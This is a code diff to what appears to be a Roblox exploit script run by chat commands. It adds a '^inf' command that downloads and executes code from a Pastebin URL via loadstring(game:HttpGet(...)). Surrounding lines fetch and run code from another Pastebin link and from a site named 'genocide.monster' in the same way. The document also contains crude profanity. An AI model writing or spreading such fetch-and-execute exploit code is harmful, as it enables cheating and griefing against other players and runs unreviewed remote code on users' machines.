@@ -205,6 +205,7 @@ game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
 ^couch   --a huge couch
 ^cloud   --gives cloud
 ^red striker
+^inf -- spawns a fucking huge ass baseplate
 
                     {Discord Command}
               ^code
@@ -931,6 +932,9 @@ CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://
     end
     if msg:lower() == "^infyl" then
         loadstring(game:HttpGet("https://pastebin.com/raw/tzTXmYf2"))()
+    end
+    if msg:lower() == "^inf" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/0k6w9XPQ"))()
     end
     if msg:lower() == "notvalid" then
         loadstring(game:HttpGet(('http://genocide.monster/script_source'),true))()
